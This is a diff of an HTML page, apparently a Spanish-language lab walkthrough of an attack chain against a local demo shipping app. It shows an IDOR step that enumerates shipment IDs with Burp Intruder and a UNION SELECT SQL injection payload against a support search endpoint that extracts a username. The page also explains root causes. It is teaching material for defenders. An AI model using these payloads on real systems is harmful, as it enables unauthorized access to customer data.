@@ -254,21 +254,21 @@
         <div class="step-body">
           <p style="font-size:.9rem;" class="mb-2">
             El atacante recibió el link de su propio envío por email
-            (<code>shipment_id=48291</code>). Cambia el ID en la URL y accede al
+            (<code>shipment_id=666</code>). Cambia el ID en la URL y accede al
             envío de Carlos Gómez sin ninguna verificación de pertenencia.
           </p>
 
           <div class="flow">
-            <div class="flow-box">Mi envío: <code>48291</code></div>
+            <div class="flow-box">Mi envío: <code>666</code></div>
             <span class="flow-arrow">→</span>
-            <div class="flow-box highlight">Cambio ID en la URL</div>
+            <div class="flow-box highlight">Fuerza bruta ↑ (Burp Intruder)</div>
             <span class="flow-arrow">→</span>
-            <div class="flow-box danger">Envío ajeno: <code>19384</code></div>
+            <div class="flow-box danger">Envío ajeno: <code>692</code></div>
           </div>
 
           <div class="code-block">
             <span class="label">REQUEST</span><br/>
-            GET <span class="url">http://localhost:5001/tracking?</span><span class="param">shipment_id</span>=<span class="inject">19384</span>
+            GET <span class="url">http://localhost:5001/tracking?</span><span class="param">shipment_id</span>=<span class="inject">692</span>
             <br/><br/>
             <span class="comment">// El servidor no verifica que shipment_id pertenezca al usuario autenticado</span>
           </div>
@@ -276,9 +276,12 @@
           <div class="result-box">
             <div class="row g-2">
               <div class="col-6"><span class="field">Nombre</span><br/><span class="val">Carlos Gomez</span></div>
-              <div class="col-6"><span class="field">Email</span><br/><span class="val">carlos.gomez@gmail.com</span></div>
-              <div class="col-6"><span class="field">user_id</span><br/><span class="val">1</span></div>
+              <div class="col-6"><span class="field">ID de cliente</span><br/><span class="val">204815</span></div>
               <div class="col-6"><span class="field">Orden</span><br/><span class="val">ORD-2026-1001</span></div>
+              <div class="col-6"><span class="field">Estado</span><br/><span class="val">En camino</span></div>
+            </div>
+            <div style="font-size:.78rem; color:#64748b; margin-top:.5rem;">
+              El detalle no expone el email — solo el ID de cliente, que habilita el Paso 2.
             </div>
           </div>
 
@@ -303,38 +306,39 @@
         </div>
         <div class="step-body">
           <p style="font-size:.9rem;" class="mb-2">
-            El formulario de búsqueda por email concatena el parámetro directamente en la query SQL.
-            El atacante inyecta un <code>UNION SELECT</code> para extraer el username de la víctima.
+            Con el ID de cliente <code>204815</code> obtenido en el Paso 1, el atacante usa el
+            buscador interno de soporte, que concatena el parámetro directamente en la query SQL.
+            Inyecta un <code>UNION SELECT</code> para extraer el username de la víctima.
           </p>
 
           <div class="code-block">
             <span class="label">BÚSQUEDA NORMAL</span><br/>
-            GET <span class="url">http://localhost:5001/?</span><span class="param">email</span>=<span class="value">carlos.gomez@gmail.com</span>
+            GET <span class="url">http://localhost:5001/support/search?</span><span class="param">user_id</span>=<span class="value">204815</span>
             <br/><br/>
-            <span class="comment">→ devuelve: ORD-2026-1001, En camino (sin username)</span>
+            <span class="comment">→ devuelve: 204815, Carlos, Gomez (sin username)</span>
           </div>
 
           <div class="code-block">
             <span class="label">PAYLOAD INYECTADO</span><br/>
-            GET <span class="url">http://localhost:5001/?</span><span class="param">email</span>=<span class="inject">' UNION SELECT id, username, first_name, last_name, email FROM users WHERE email='carlos.gomez@gmail.com'--</span>
+            GET <span class="url">http://localhost:5001/support/search?</span><span class="param">user_id</span>=<span class="inject">204815 UNION SELECT id, username, last_name FROM users WHERE id=204815--</span>
           </div>
 
           <div class="code-block">
             <span class="label">QUERY RESULTANTE EN EL SERVIDOR</span><br/>
-            SELECT s.shipment_id, s.order_number, s.status, ...<br/>
-            FROM shipments s JOIN users u ON s.user_id = u.id<br/>
-            WHERE u.email = <span class="inject">'' UNION SELECT id, username, first_name,<br/>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;last_name, email FROM users WHERE email='carlos.gomez@gmail.com'--</span>
+            SELECT u.id, u.first_name, u.last_name<br/>
+            FROM users u<br/>
+            WHERE u.id = <span class="inject">204815 UNION SELECT id, username,<br/>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;last_name FROM users WHERE id=204815--</span>
           </div>
 
           <div class="result-box">
-            <span class="field">Username extraído</span><br/>
+            <span class="field">Username extraído (aparece en la columna Nombre)</span><br/>
             <span class="val" style="font-size:1.05rem;">carlos_gomez</span>
           </div>
 
           <div class="why-box mt-2">
             <strong>Raíz del problema:</strong> el backend construye la query con f-string:
-            <code>f"WHERE u.email = '{email}'"</code> sin usar consultas parametrizadas.
+            <code>f"WHERE u.id = {user_id}"</code> sin usar consultas parametrizadas.
             No hay contraseñas en la tabla, pero el username es suficiente para el paso siguiente.
           </div>
         </div>
@@ -486,14 +490,14 @@
           <tr>
             <td class="ps-3 fw-semibold">1</td>
             <td><span class="portal-badge portal-tracking">Tracking</span></td>
-            <td><code>GET /tracking?shipment_id=19384</code></td>
+            <td><code>GET /tracking?shipment_id=692</code></td>
             <td><span class="vuln-tag" style="background:#dbeafe;color:#1d4ed8;">A01 IDOR</span></td>
-            <td>Nombre, email y user_id de la víctima</td>
+            <td>Nombre + ID de cliente de la víctima (204815)</td>
           </tr>
           <tr>
             <td class="ps-3 fw-semibold">2</td>
             <td><span class="portal-badge portal-tracking">Tracking</span></td>
-            <td><code>GET /?email=' UNION SELECT…</code></td>
+            <td><code>GET /support/search?user_id=204815 UNION SELECT…</code></td>
             <td><span class="vuln-tag" style="background:#dbeafe;color:#1d4ed8;">A05 SQLi</span></td>
             <td>Username: <code>carlos_gomez</code></td>
           </tr>
